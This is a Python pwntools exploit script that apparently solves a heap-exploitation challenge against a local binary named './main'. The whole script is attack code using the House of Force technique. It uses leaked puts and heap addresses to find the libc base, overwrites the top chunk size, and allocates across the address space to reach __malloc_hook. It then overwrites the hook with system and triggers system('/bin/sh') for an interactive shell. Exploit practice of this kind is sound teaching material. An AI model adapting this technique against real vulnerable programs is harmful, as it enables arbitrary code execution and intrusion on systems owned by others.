#!/usr/bin/python3
from pwn import *

# Set the terminal for debugging
# context.terminal = ['alacritty', '-e']
elf = context.binary = ELF("./main")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Function to select the "malloc" option and send size & data.
def malloc(size, data):
    io.sendline(b"1")  # Send option to malloc as bytes
    io.sendafter(b"size: ", str(size).encode())  # Send size as bytes
    io.sendafter(b"data: ", data)  # Send data (already bytes)
    io.recvuntil(b"> ")  # Wait for prompt as bytes

# Function to calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

# Start the process
io = start()

# Leak the puts() address and calculate libc base address
io.recvuntil(b"puts func address leak() > ")  # Read puts address as bytes
libc.address = int(io.recvline().strip(), 16) - libc.sym.puts

# Leak the heap start address
io.recvuntil(b"heap address > ")  # Read heap address as bytes
heap = int(io.recvline().strip(), 16)
io.recvuntil(b"> ")  # Wait for prompt as bytes
io.timeout = 0.1  # Set timeout for receiving data

# Stage 1: Create the initial malloc to set up the fake chunk
malloc(24, b"Y" * 24 + p64(0xffffffffffffffff))  # Create fake chunk

# Calculate the distance to the __malloc_hook
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
malloc(distance, b"/bin/sh\0")  # Allocate space for "/bin/sh"

# Stage 3: Overwrite __malloc_hook with system
malloc(24, p64(libc.sym.system))  # Overwrite __malloc_hook

# Allocate to call system("/bin/sh")
cmd = next(libc.search(b'/bin/sh'))  # Find the "/bin/sh" string in libc
malloc(cmd, b"")  # Trigger system("/bin/sh")

# Interact with the shell
io.interactive()

